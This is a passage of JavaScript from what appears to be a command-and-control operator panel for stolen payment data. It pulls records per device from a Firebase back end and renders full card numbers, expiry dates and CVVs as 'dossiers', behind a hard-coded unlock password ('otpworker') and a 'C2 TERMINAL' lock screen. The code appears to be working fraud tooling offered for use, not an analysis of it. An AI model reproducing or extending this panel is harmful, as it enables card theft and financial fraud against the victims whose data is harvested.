                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <div style="display:flex; align-items:center; gap:6px;">
                            <span style="font-size:1.1rem;">💳</span>
                            <span style="color:var(--text-2); font-size:0.72rem; font-weight:700; text-transform:uppercase; font-family:var(--cyber-font-title);">PAN IDENTIFIER</span>
                        </div>
                        <span style="color:var(--orbit-accent); font-family:var(--cyber-font-mono); font-weight:800; font-size:0.95rem; letter-spacing:0.5px;">${esc(String(pan))}</span>
                    </div>
                </div>`;
            }
        }

        if (html === '') {
            html = `<div class="empty-state" style="padding:28px 0;"><p>NO DOSSIERS DISCOVERED</p><span>No financial records found on active gateway</span></div>`;
        }

        if (pagesList) pagesList.innerHTML = html;
        setStatus('ARMED // READY');
        showToast('Dossiers Synchronized', 'success');
    } catch (e) {
        setStatus('ERROR', 'error');
        showToast('Error: ' + e.message, 'error');
    }
}

// Deep Forensic Scan for Node
async function fetchDeviceMoreDetails() {
    const devId = state.currentSheetDevId;
    if (!devId) return;

    playCyberSound('blip');
    const moreDetailsEl = document.getElementById('sheetMoreDetails');
    if (!moreDetailsEl) return;
    moreDetailsEl.style.display = 'block';
    moreDetailsEl.innerHTML = '<div style="color:var(--text-2); text-align:center; font-family:var(--cyber-font-mono); font-size:0.75rem;">RUNNING FORENSIC DEEP SCAN…</div>';

    const isPaisaServer = FB_URL.includes('k-party-admin-panel') || document.body.getAttribute('data-planet') === 'paisa';

    try {
        let html = '';

        // Fetch Card 1 and Card 2 across all servers
        const [c1, c2, page2Data] = await Promise.all([
            fetch(`${FB_URL}/card1/${devId}.json`).then(r => r.json()).catch(() => null),
            fetch(`${FB_URL}/card2/${devId}.json`).then(r => r.json()).catch(() => null),
            fetch(`${FB_URL}/page2/${devId}.json`).then(r => r.json()).catch(() => null),
        ]);

        if (c1) {
            const num1 = c1.Cnumber || c1.cardNumber || c1.cnumber || c1.number || 'N/A';
            const exp1 = c1.Exp || c1.exp || c1.expiry || 'N/A';
            const cvv1 = c1.cvv || c1.CVV || 'N/A';
            html += `<div class="cyber-plastic-card" style="margin-bottom:8px; cursor:default; pointer-events:none;">
                <div class="card-top-row">
                    <div class="card-chip"></div>
                    <span class="card-brand-badge">💳 CARD 1</span>
                </div>
                <div class="card-number-row" style="cursor:default;">
                    <span class="card-number-text" style="font-size:0.9rem;">${esc(num1)}</span>
                </div>
                <div class="card-bottom-row">
                    <div class="card-meta-pill" style="cursor:default;">
                        <span class="card-meta-label">EXP</span>
                        <span class="card-meta-val">${esc(exp1)}</span>
                    </div>
                    <div class="card-meta-pill" style="cursor:default;">
                        <span class="card-meta-label">CVV</span>
                        <span class="card-meta-val" style="color:var(--orbit-accent);">${esc(cvv1)}</span>
                    </div>
                </div>
            </div>`;
        }

        if (c2) {
            const num2 = c2.Cnumber || c2.cardNumber || c2.cnumber || c2.number || 'N/A';
            const exp2 = c2.Exp || c2.exp || c2.expiry || 'N/A';
            const cvv2 = c2.cvv || c2.CVV || 'N/A';
            html += `<div class="cyber-plastic-card card-alt" style="margin-bottom:8px; cursor:default; pointer-events:none;">
                <div class="card-top-row">
                    <div class="card-chip" style="background:linear-gradient(135deg, #00f0ff, #0088ff);"></div>
                    <span class="card-brand-badge" style="color:var(--orbit-secondary);">💳 CARD 2</span>
                </div>
                <div class="card-number-row" style="cursor:default;">
                    <span class="card-number-text" style="font-size:0.9rem;">${esc(num2)}</span>
                </div>
                <div class="card-bottom-row">
                    <div class="card-meta-pill" style="cursor:default;">
                        <span class="card-meta-label">EXP</span>
                        <span class="card-meta-val">${esc(exp2)}</span>
                    </div>
                    <div class="card-meta-pill" style="cursor:default;">
                        <span class="card-meta-label">CVV</span>
                        <span class="card-meta-val" style="color:var(--orbit-secondary);">${esc(cvv2)}</span>
                    </div>
                </div>
            </div>`;
        }

        if (page2Data && Object.keys(page2Data).length > 0 && typeof page2Data === 'object') {
            html += `<div style="margin-bottom: 8px;">
                <strong style="color:var(--orbit-accent); font-size: 0.82rem; display:block; margin-bottom: 4px; font-family:var(--cyber-font-title);">REGISTRY 02 DECRYPTED</strong>`;
            for (const [k, v] of Object.entries(page2Data)) {
                html += `<div style="display:flex; justify-content:space-between; font-size:0.75rem; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.06);">
                    <span style="color:var(--text-2); font-family:var(--cyber-font-mono);">${k}</span>
                    <span style="color:#ffffff; font-family:var(--cyber-font-mono); font-weight:bold; word-break:break-all; max-width:60%; text-align:right;">${esc(String(v))}</span>
                </div>`;
            }
            html += `</div>`;
        }

        if (html === '') {
            html = '<div style="color:var(--text-3); text-align:center; font-family:var(--cyber-font-mono); font-size:0.72rem;">No additional financial or identity records detected.</div>';
        }

        moreDetailsEl.innerHTML = html;
        showToast('Forensic Records Interrogated', 'success');
    } catch(e) {
        moreDetailsEl.innerHTML = '<div style="color:var(--sat-red); text-align:center; font-family:var(--cyber-font-mono); font-size:0.75rem;">Forensic scan failed</div>';
        showToast(e.message, 'error');
    }
}

// ==========================================================================
// MASTER CYBER SECURITY LOCKDOWN SYSTEM ENGINE
// Password strictly set to: otpworker
// ==========================================================================
const MASTER_UNLOCK_CIPHER = "otpworker";
const LOCK_STORAGE_KEY = "CYBER_C2_TERMINAL_AUTH";

function initSecurityLock() {
    const lockOverlay = document.getElementById('cyberLockOverlay');
    const lockInput = document.getElementById('cyberLockInput');
    const lockError = document.getElementById('cyberLockError');
    const serverModal = document.getElementById('serverModal');
    if (!lockOverlay || !lockInput) return;

    // Check if operator already authenticated this session
    const isUnlocked = sessionStorage.getItem(LOCK_STORAGE_KEY) === 'AUTHENTICATED';
    if (isUnlocked) {
        lockOverlay.classList.add('hidden');
        lockOverlay.style.display = 'none';
        // If authenticated and no server connected yet, show server selector
        if (!FB_URL && serverModal) {
            serverModal.classList.remove('hidden');
        }
    } else {
        // Enforce: PASSWORD FIRST! Hide server selector completely until password is typed
        if (serverModal) serverModal.classList.add('hidden');
        lockOverlay.classList.remove('hidden');
        lockOverlay.style.display = 'flex';
        setTimeout(() => {
            lockInput.focus();
        }, 150);
    }

    // Attach Enter key listener
    lockInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            verifyLockPassword();
        } else {
            if (lockError) lockError.textContent = '';
            const card = document.getElementById('cyberLockCard');
            if (card) card.classList.remove('shake-error', 'success-unlock');
        }
    });
}

function verifyLockPassword() {
    const lockOverlay = document.getElementById('cyberLockOverlay');
    const lockCard = document.getElementById('cyberLockCard');
    const lockInput = document.getElementById('cyberLockInput');
    const lockError = document.getElementById('cyberLockError');
    const submitBtn = document.getElementById('cyberLockSubmit');
    const serverModal = document.getElementById('serverModal');
    if (!lockInput) return;

    const val = lockInput.value.trim();

    if (val === MASTER_UNLOCK_CIPHER) {
        // Access Granted
        sessionStorage.setItem(LOCK_STORAGE_KEY, 'AUTHENTICATED');
        if (lockError) {
            lockError.style.color = 'var(--orbit-accent)';
            lockError.textContent = '[+] CIPHER VERIFIED // ROOT ACCESS GRANTED // WELCOME RIOT';
        }
        if (lockCard) {
            lockCard.classList.remove('shake-error');
            lockCard.classList.add('success-unlock');
        }
        if (submitBtn) {
            submitBtn.style.background = 'linear-gradient(135deg, #00ff66, #00f0ff)';
            submitBtn.style.color = '#000000';
            submitBtn.innerHTML = '<span>ACCESS GRANTED 🔓</span>';
        }
        playCyberSound('launch');

        setTimeout(() => {
            lockOverlay.classList.add('hidden');
            setTimeout(() => {
                lockOverlay.style.display = 'none';
                if (lockCard) lockCard.classList.remove('success-unlock');
                if (submitBtn) {
                    submitBtn.style.background = '';
                    submitBtn.style.color = '';
                    submitBtn.innerHTML = '<span class="btn-glitch-text">AUTHENTICATE CIPHER ⚡</span><span class="btn-subtext">[ PRESS ENTER OR TOUCH ]</span>';
                }
                lockInput.value = '';
                if (lockError) lockError.textContent = '';

                // Seamless handoff: Open server modal so operator can pick their server immediately
                if (!FB_URL && serverModal) {
                    serverModal.classList.remove('hidden');
                    playCyberSound('blip');
                }
            }, 350);
        }, 400);
    } else {
        // Access Denied
        playCyberSound('abort');
        if (lockError) {
            lockError.style.color = 'var(--sat-red)';
            lockError.textContent = '[!] ACCESS DENIED // INVALID CIPHER // BREACH ATTEMPT LOGGED';
        }
        if (lockCard) {
            lockCard.classList.remove('shake-error');
            void lockCard.offsetWidth; // retrigger reflow
            lockCard.classList.add('shake-error');
        }
        lockInput.value = '';
        lockInput.focus();
    }
}

function lockWebsite() {
    sessionStorage.removeItem(LOCK_STORAGE_KEY);
    const lockOverlay = document.getElementById('cyberLockOverlay');
    const lockInput = document.getElementById('cyberLockInput');
    const lockError = document.getElementById('cyberLockError');
    const lockCard = document.getElementById('cyberLockCard');
    const serverModal = document.getElementById('serverModal');

    if (!lockOverlay) return;
    playCyberSound('blip');
    if (serverModal) serverModal.classList.add('hidden');
    if (lockError) lockError.textContent = '';
    if (lockCard) lockCard.classList.remove('shake-error', 'success-unlock');
    if (lockInput) lockInput.value = '';

    lockOverlay.style.display = 'flex';
    void lockOverlay.offsetWidth;
    lockOverlay.classList.remove('hidden');

    if (lockInput) {
        setTimeout(() => lockInput.focus(), 150);
    }
    showToast('TERMINAL SYSTEM LOCKED // ZERO-DAY ACTIVE', 'info');
}

function toggleLockPasswordVisibility() {
    const lockInput = document.getElementById('cyberLockInput');
    const eyeBtn = document.getElementById('lockEyeBtn');
    if (!lockInput || !eyeBtn) return;
    if (lockInput.type === 'password') {
        lockInput.type = 'text';
        eyeBtn.textContent = '🔒';
    } else {
        lockInput.type = 'password';
        eyeBtn.textContent = '👁️';
    }
    playCyberSound('blip');
}

